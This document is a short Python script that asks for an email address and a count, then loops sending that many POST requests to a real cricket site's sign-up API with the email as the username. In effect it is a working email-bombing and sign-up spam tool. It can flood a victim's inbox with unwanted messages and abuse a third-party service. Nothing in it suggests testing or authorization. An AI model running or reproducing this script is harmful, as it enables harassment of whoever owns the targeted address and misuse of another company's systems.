import requests
import json

email = input("Enter Email: ")
amount = int(input("Enter Amount: "))

# URL endpoint to send the POST request
url = 'https://m.cricbuzz.com/api/cbplus/auth/user/sign-up'

# JSON data to send in the body of the request
data = {
    'username': email
}

# Headers for the request
headers = {
    'Content-Type': 'application/json'
}

# Convert Python dictionary to JSON string
json_data = json.dumps(data)

# Make the POST request with specified URL, JSON data, and headers
for i in range(amount):
    try:
        response = requests.post(url, data=json_data, headers=headers)
        print(f"Response {i+1}: {response.text}")
    except Exception as e:
        print(f"Error occurred in request {i+1}: {e}")